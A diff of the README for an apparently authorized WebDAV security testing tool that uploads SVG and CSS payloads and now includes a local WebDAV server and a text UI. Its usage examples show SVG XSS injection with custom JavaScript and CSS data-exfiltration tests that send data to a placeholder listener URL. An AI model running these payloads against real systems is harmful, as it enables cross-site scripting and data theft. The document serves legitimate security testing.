@@ -20,6 +20,7 @@ The Enhanced WebDAV Security Assessment Tool (EWT) is a Python-based command-lin
 *   **Comprehensive Reporting**: Generates detailed Markdown reports summarizing test activities, successes, failures, and basic security recommendations.
 *   **Configurable Output**: Control directories for generated payloads, reports, and logs.
 *   **Logging**: Detailed logging of operations for debugging and audit.
+*   **Integrated WebDAV Server**: A lightweight, scriptable WebDAV server for hosting payloads locally.
 
 ### Operational Security Features
 
@@ -39,17 +40,20 @@ The Enhanced WebDAV Security Assessment Tool (EWT) is a Python-based command-lin
 ## Requirements
 
 *   Python 3.8+
-*   External libraries: `requests` (ensure this is installed, e.g., `pip install requests`)
+*   External libraries: `requests`, `wsgidav`, `cheroot`, `textual`
 
 ## Installation
 
 1.  Ensure Python 3.8+ is installed.
-2.  Clone the repository or download all the Python files (`ewt_cli.py`, `webdav_security_tester.py`, `payload_generator.py`, `svg_payload_generator.py`, `css_payload_generator.py`) into a single directory.
-3.  Install the `requests` library:
+2.  Clone the repository.
+3.  Install the required libraries from `requirements.txt`:
     ```bash
-    pip install requests
+    pip install -r requirements.txt
     ```
-    (If a `requirements.txt` file is provided with the tool, you can use `pip install -r requirements.txt`.)
+    To use the TUI, you will also need to install `textual`:
+    ```bash
+    pip install textual
+    ```
 
 ## Usage (`ewt_cli.py`)
 
@@ -70,32 +74,38 @@ python ewt_cli.py --help
 *   `--report-dir DIR`: Specific directory for Markdown reports. Default: `<output-dir>/reports`.
 *   `--log-level LEVEL`: Set console logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL). Default: INFO.
 
+### Running the WebDAV Server
+
+You can start a local WebDAV server to host payloads for testing purposes.
+
+```bash
+python ewt_cli.py serve --dir ./my_payloads --port 8080
+```
+
+*   `--dir`: The root directory to serve files from (default: `./webdav_root`).
+*   `--host`: The host IP to bind to (default: `0.0.0.0`).
+*   `--port`: The port to run the server on (default: 8080).
+
 ### Running Tests
 
 **1. List Available Tests:**
 To see all built-in payload types:
 ```bash
-python ewt_cli.py --url http://ignore.me --list-tests
+python ewt_cli.py test --list-tests --url http://ignore.me
 ```
-*(Note: `--url` is technically required by argparse even for `--list-tests` for the current CLI design, but its value isn't used in this mode beyond initializing the WebDAVClient which isn't strictly needed for just listing).*
 
 **2. Run a Single Test:**
 Use the format `FILETYPE/PAYLOADNAME`.
 ```bash
 # Basic SVG test
-python ewt_cli.py --url <TARGET_URL> --test svg/basic
+python ewt_cli.py test --url <TARGET_URL> --test svg/basic
 
 # SVG with custom JavaScript in a <script> tag
-python ewt_cli.py --url <TARGET_URL> --test svg/script_tag --js-code "alert('My Custom SVG XSS: ' + document.domain);"
+python ewt_cli.py test --url <TARGET_URL> --test svg/script_tag --js-code "alert('My Custom SVG XSS: ' + document.domain);"
 
 # CSS data exfiltration test using @font-face, with a custom callback
-python ewt_cli.py --url <TARGET_URL> --test css/font_face_exfil --callback-url "https://my.listener.com/css_font_hit"
+python ewt_cli.py test --url <TARGET_URL> --test css/font_face_exfil --callback-url "https://my.listener.com/css_font_hit"
 ```
-
-**Available Payload Parameters for `--test` mode:**
-*   `--js-code "JAVASCRIPT_CODE"`: For SVG payloads like `script_tag`, `event_handler`, `animate`, `foreign_object`, `polyglot`. Also for SVG `data_exfil` if `data_to_exfil_script` parameter is used within it.
-*   `--callback-url "URL"`: For exfiltration payloads like `svg/data_exfil`, `css/background_exfil`, `css/font_face_exfil`, etc.
-*   `--target-element "CSS_SELECTOR"`: For some CSS payloads like `css/input_value_exfil` or `css/keylogger_simulation` (where it's used as `target_input_selector`).
 
 **3. Run Batch Tests from a JSON File:**
 Create a JSON file defining multiple tests. Example (`my_tests.json`):
@@ -114,13 +124,12 @@ Create a JSON file defining multiple tests. Example (`my_tests.json`):
       "params": {"callback_url": "https://my.listener.com/batch_media_query"},
       "remote_target_dir": "my_company_tests/css_fingerprinting"
     }
-    // Add more test configurations here
   ]
 }
 ```
 Then run:
 ```bash
-python ewt_cli.py --url <TARGET_URL> --batch my_tests.json
+python ewt_cli.py batch --url <TARGET_URL> --config my_tests.json
 ```
 The `remote_target_dir` in the JSON is optional for each test item; the tool will use a default if not provided.
 
@@ -154,16 +163,29 @@ The `remote_target_dir` in the JSON is optional for each test item; the tool wil
 *   `ewt_cli.py`: Main command-line interface.
 *   `webdav_security_tester.py`: Orchestrates tests (`WebDAVSecurityTester` class).
 *   `webdav_client.py`: Handles WebDAV communications (`WebDAVClient` class).
+*   `webdav_server.py`: Provides the integrated WebDAV server (`DAVServer` class).
 *   `payload_generator.py`: Base class for payload generation (`PayloadGenerator`).
 *   `svg_payload_generator.py`: Generates SVG payloads (`SVGPayloadGenerator` class).
 *   `css_payload_generator.py`: Generates CSS payloads (`CSSPayloadGenerator` class).
+*   `ewt_tui.py`: A Textual-based user interface for the tool.
+
+## Textual User Interface (TUI)
+
+The tool includes a TUI for interactive use. To run it, execute:
+
+```bash
+python ewt_tui.py
+```
+
+The TUI provides access to the same features as the CLI, including:
+*   Configuring the target WebDAV server.
+*   Selecting tests to run.
+*   Running tests and viewing live output.
+*   Viewing generated reports.
+*   Starting and stopping the integrated WebDAV server.
 
 ## Disclaimer
 
 This tool is for educational and authorized testing purposes only. The user is responsible for any and all actions performed using this tool. Ensure you comply with all applicable laws and obtain necessary permissions before testing any system.
 ---
-A `requirements.txt` file should also be created for this new tool:
-```
-requests
-```
-(Currently, only `requests` is a direct external dependency for the core functionality. `rich` was for DAVBest, this new tool doesn't explicitly use it yet unless added for fancier CLI output later).
+The `requirements.txt` file includes all necessary dependencies for the CLI and WebDAV server. The TUI requires `textual`, which can be installed separately.
